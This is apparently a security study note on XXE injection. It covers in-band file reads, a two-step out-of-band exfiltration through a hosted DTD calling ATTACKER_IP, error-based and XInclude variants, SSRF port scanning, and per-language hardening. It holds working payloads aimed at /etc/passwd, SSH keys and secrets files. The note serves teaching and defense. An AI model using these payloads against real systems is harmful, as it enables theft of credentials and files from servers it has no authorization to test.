#webapplications

OWASP A05 (Injection). XML External Entity injection: a malformed XML document declares an external entity that points to a file the attacker wants to read. The parser resolves the entity and leaks the file content.

## How it works
```xml
<!-- Normal XML -->
<course>
  <code>CYBR401</code>
</course>

<!-- Malicious: declare an external entity -->
<!DOCTYPE course [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<course>
  <code>&xxe;</code>
</course>
```

When the XML parser processes this, it:
1. Sees the `ENTITY` declaration
2. Resolves `SYSTEM "file:///etc/passwd"` (reads the file)
3. Replaces `&xxe;` with the file contents
4. Returns the result to the application

**The file is read server-side and returned in the response.**

## Testing workflow

1. **Identify an XML input** — anywhere the app accepts XML:
   ```
   POST /api/upload Content-Type: application/xml
   POST /api/config (JSON body that gets parsed as XML)
   SVG upload (SVG is XML)
   SOAP service
   ```

2. **Test basic XXE** — inject a harmless external entity first:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE test [
     <!ENTITY xxe SYSTEM "file:///etc/hostname">
   ]>
   <test>&xxe;</test>
   ```

3. **Read the response** — the file content should appear:
   - Success: Response contains the hostname/file contents
   - Blocked: Entity declaration rejected or empty response
   - Parsing error: Parser caught the XXE but errored

4. **Escalate to data exfiltration** — common files to target:
   ```
   /etc/passwd          (user list)
   /etc/shadow          (password hashes, needs root)
   ~/.ssh/id_rsa        (SSH key)
   /app/config.php      (database credentials)
   /app/.env            (secrets)
   C:\windows\win.ini   (Windows config)
   ```

## Entity expansion — proving the parser is vulnerable before you escalate

Before reaching for file reads, confirm the parser actually substitutes entities by declaring a harmless one and referencing it more than once:

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "This is a test message" >]>
<contact><name>&xxe; &xxe;</name></contact>
```

If the response shows the string twice, entity substitution is live — even if `SYSTEM` file reads later get blocked by a filter, this confirms the primitive exists and it's a config/path problem, not "XXE is off." This is also the mechanism behind the **Billion Laughs** DoS: entities nested inside entities multiply exponentially (`lol2` references `lol1` twice, `lol3` references `lol2` twice, etc.), so a few hundred bytes of XML expands to gigabytes in memory — a resource-exhaustion attack, not a data-exfil one.

## Blind XXE — when the response doesn't show the file

If the server doesn't echo back the entity, you can still exfiltrate via **out-of-band** (OOB) requests. Start a listener you control (`python3 -m http.server 1337`, or Burp Collaborator) and confirm the target reaches it at all with a minimal callback:

```xml
<!DOCTYPE upload [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
<upload><file>&xxe;</file></upload>
```

A hit on your listener confirms SSRF-via-XXE works — but it doesn't yet exfiltrate anything, and trying to chain a `SYSTEM` file read straight into that same request's internal DOCTYPE (`<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY oob SYSTEM "http://attacker/?x=%file;">`) usually **fails** against modern libxml2: a parameter entity declared in the internal DTD subset can't be expanded inside another entity's value within that same internal subset. You have to move the chaining into an **externally-loaded DTD**, which doesn't have that restriction — this is the standard two-step OOB XXE technique:

**Step 1 — host a malicious external DTD** (`sample.dtd`) on your listener:
```dtd
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```
- `%cmd` is a **parameter entity** (`%`, not `&`) — it reads `/etc/passwd` through PHP's `php://filter` wrapper with `convert.base64-encode`, so the content comes back as one Base64 blob instead of raw bytes. This matters because raw file content almost always contains `<`, `&`, quotes, or non-UTF8 bytes that would either break the XML parse or get mangled in a URL query string — Base64 sidesteps both problems.
- `%oobxxe` is a parameter entity whose *value is itself an entity declaration*: when the parser expands `%oobxxe;`, it dynamically defines a new general entity `exfil` whose `SYSTEM` identifier is your server URL with `%cmd;` (the base64 data) appended as a query param.
- The final bare `%oobxxe;` triggers that expansion, which immediately causes `exfil` to be dereferenced — firing the outbound request with the data attached.

**Step 2 — point the victim's DOCTYPE at the external DTD, and reference the entity it defines:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
<upload>
    <file>&exfil;</file>
</upload>
```

Two requests land on your listener: first the fetch of `sample.dtd` itself, then the real exfil request from the target server with `?data=<base64>` — decode that to recover the file. If your target has strict egress filtering (outbound HTTP blocked entirely), see **error-based blind XXE** below instead — it needs zero outbound connection.

### No outbound access at all — error-based blind XXE

When the box can't reach you on *any* port (egress fully blocked), abuse XML parser error messages instead — they get reflected even when the parsed data normally isn't. This forces the parser to try loading a nonexistent file whose name is the target file's content, so the resulting "file not found" error echoes that content back:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<foo>test</foo>
```
`&#x25;` is just `%` HTML-entity-encoded — needed because a literal `%` inside a parameter entity's *value* would be parsed as another entity reference instead of a literal character. This only works if the application surfaces parser errors to you (verbose error pages, debug mode) — if errors are swallowed, you're back to OOB or need a different sink entirely.

## XInclude — when you can't control the DOCTYPE

If your injection point is just *one field's value* inside an XML document whose top-level structure (and DOCTYPE) you don't control, you can't declare an entity at all. `XInclude` works from inside a normal element instead:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
No `DOCTYPE` needed, so this also slips past filters that specifically strip `<!DOCTYPE`. Use it when the app builds XML server-side and only interpolates your value into it (e.g. a SOAP request where you control one parameter).

## SSRF via XXE — internal network/port scanning

A server with an in-band XXE sink will dutifully fetch whatever URL you put in a `SYSTEM` entity — including `http://localhost:<port>/` or any other internal-only address, since the request originates from the server itself, not from you. That makes it a built-in SSRF primitive: you can use it to find internal services the way you'd use any other SSRF, without needing a second vulnerability.

**Port-scanning an in-band XXE with Burp Intruder:**
```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```
1. Take a captured in-band XXE request (one that reflects the entity back in the response) and send it to Intruder.
2. Mark the port number as the only payload position (`§10§`).
3. Payload type **Numbers**, range 1–65535 (narrow this with known-likely ranges first if you have context — full 65535 is slow).
4. Run the attack, then sort by **response length**. An outlier length means that port returned *something* different — a banner, an HTML page, a JSON blob, or just a different error — worth manually following up.

Why this works: `&xxe;` is referenced inside `<name>`, so at parse time the server fetches the URL and splices the response body into the document, which then comes back to you in-band. If the target behind that port is itself talking HTTP, you get its actual response reflected to you through the XXE sink — including hardcoded API keys/secrets/internal banners if the service leaks them, which you can then feed into further attacks (e.g. credential/key reuse elsewhere).

**What you're actually looking for:**
- **Reconnaissance** — which internal ports/services exist and what they are (fingerprint via banner/response shape), mapping the server's internal network from the outside.
- **Data leakage** — an internal admin panel, metadata service, or management API that returns secrets directly in its response body.
- **Further exploitation** — a reachable internal service becomes a pivot point; this is the same class of target as cloud metadata endpoints (`169.254.169.254`) already noted in the variants table above.

If the sink is blind instead of in-band, you lose the response-length signal — fall back to timing differences (open ports usually respond/reset faster than closed/filtered ones) or chain the OOB DTD technique to have the server tell you what it found.

## Common gotchas

| Gotcha | What goes wrong | Fix |
| --- | --- | --- |
| Doctype declarations blocked | `<!DOCTYPE` is filtered | Try `XInclude` (no DOCTYPE needed) or check if DOCTYPE is only blocked case-sensitively/at the start of the body |
| File doesn't exist or permission denied | Response is empty or error | Verify the file path; use `/etc/passwd` for testing (readable on Unix) |
| Entity output breaks the XML/response | Special chars (`&`, `<`, raw binary) in the file corrupt the reflected XML or the OOB URL | Wrap the read in `php://filter/convert.base64-encode/resource=...` (or the Java/`.NET` equivalent) so the exfiltrated data is pure Base64 |
| Parameter entity chained to a general entity in the same internal DOCTYPE doesn't fire | Modern libxml2 restricts parameter-entity expansion inside the internal DTD subset | Move the chaining into an **externally-hosted DTD** and have the victim's DOCTYPE point at it (see external-DTD technique above) |
| Parser disabled external entities | XXE is patched in the library, or defaults already block it | Check app behavior; try entity-expansion detection first to confirm whether substitution is live at all before assuming it's fully patched |

## XXE variants
| Variant | What it does | When to use |
| --- | --- | --- |
| **Basic XXE (in-band)** | Entity replaced in response | File content appears in visible output |
| **Blind XXE — OOB** | No output, parser resolves the entity | Egress allowed: external-DTD + parameter-entity chain, exfil via your own listener |
| **Blind XXE — error-based** | No output, no egress | Force a parser error that reflects the file content in the error message |
| **SSRF via XXE** | External entity points to internal URL | Read data from internal services (localhost:8080, 169.254.169.254 cloud metadata) |
| **XInclude** | No DOCTYPE control, only one field's value | DOCTYPE filtered/stripped, or you only control a value inside app-built XML |
| **Billion Laughs / XML bomb** | Nested entity expansion consumes memory | DoS attack; not for data exfiltration |

## Defenses

```php
// VULNERABLE — this exact pattern is what re-enables XXE in PHP's DOMDocument:
$dom = new DOMDocument();
$dom->loadXML($xml_data, LIBXML_NOENT | LIBXML_DTDLOAD);
// LIBXML_DTDLOAD lets the parser fetch an external DTD at all; LIBXML_NOENT
// tells it to substitute entities (including ones that external DTD just defined).
// Together they re-open XXE even though PHP calls this out as a known-dangerous combo.

// FIX — just don't pass those flags. A plain loadXML() call does not load
// external DTDs or expand entities:
$dom = new DOMDocument();
$dom->loadXML($xml_data);
```

**`libxml_disable_entity_loader()` is a dead end to rely on** — it's deprecated since PHP 8.0 and has been a no-op since libxml 2.9.0 (released 2012), because external entity loading was already disabled by default at the libxml level from that version on. The actual fix in modern PHP is simply not opting back in via `LIBXML_NOENT` / `LIBXML_DTDLOAD` / `LIBXML_DTDATTLIST`. If you see `libxml_disable_entity_loader(true)` in code as "the fix," it's giving a false sense of security on any libxml2 ≥ 2.9 — the real question is always which flags got passed to `loadXML`/`load`.

| Language / library | Unsafe by default? | Hardening |
| --- | --- | --- |
| PHP `DOMDocument` / `SimpleXML` | Safe by default (libxml ≥2.9); unsafe only if `LIBXML_NOENT`/`LIBXML_DTDLOAD` explicitly passed | Don't pass those flags; if you must, pair with `libxml_set_external_entity_loader()` returning `null` |
| Java `DocumentBuilderFactory` / `SAXParserFactory` / `XMLInputFactory` | **Unsafe by default** | `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`, or disable `external-general-entities` / `external-parameter-entities` and set `XMLConstants.FEATURE_SECURE_PROCESSING` |
| Python `lxml.etree` | Safe by default since lxml 4.x (`resolve_entities` defaults off for untrusted input in recent versions, but verify) | `XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)` |
| Python stdlib `xml.etree.ElementTree` | Doesn't expand external entities | Still prefer `defusedxml` as a drop-in replacement for defense-in-depth |
| .NET `XmlDocument` / `XmlReader` | Unsafe by default on old .NET Framework (<4.5.2); safe on .NET Core/5+ | Set `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit` explicitly |
| Ruby `Nokogiri` | Safe-ish; `NOENT` option re-enables entity substitution | Don't pass `Nokogiri::XML::ParseOptions::NOENT` |

General principle regardless of language: **disable DTD processing entirely** if the app never legitimately needs custom entities — that kills XXE, Billion Laughs, and XInclude-based reads in one setting, and is more robust than trying to selectively allow "safe" DTD features.
